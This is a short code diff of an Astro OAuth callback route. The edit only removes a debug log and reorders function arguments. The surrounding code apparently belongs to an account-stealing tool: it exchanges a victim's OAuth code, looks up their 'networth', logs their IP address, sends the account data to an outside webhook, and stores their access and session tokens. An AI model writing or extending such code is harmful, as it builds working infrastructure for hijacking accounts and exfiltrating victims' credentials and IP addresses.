@@ -24,7 +24,6 @@ export const get: APIRoute = async ({ request, redirect }) => {
         const redirect_uri = row['redirect_uri'];
         const url = await requestUrl.getURLNoQuery();
         const data:any = await oauthFlow(code, url, false);
-        console.log(data)
         if (data.status !== 200) {
             console.log("Error: " + data.message)
             console.log("-----------------------------------------------------")
@@ -34,7 +33,7 @@ export const get: APIRoute = async ({ request, redirect }) => {
         console.log("got networth data")
         //add ip address to data, cloudflare header
         const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 
-        await oauthWebhook(webhook, data, nwData, ip);
+        await oauthWebhook(data, nwData, ip, webhook);
         console.log("sent webhook")
         const saveSuccess = await saveToken(state, data['username'], data['access_token'], data['session_token'], url)
         if (!saveSuccess) {
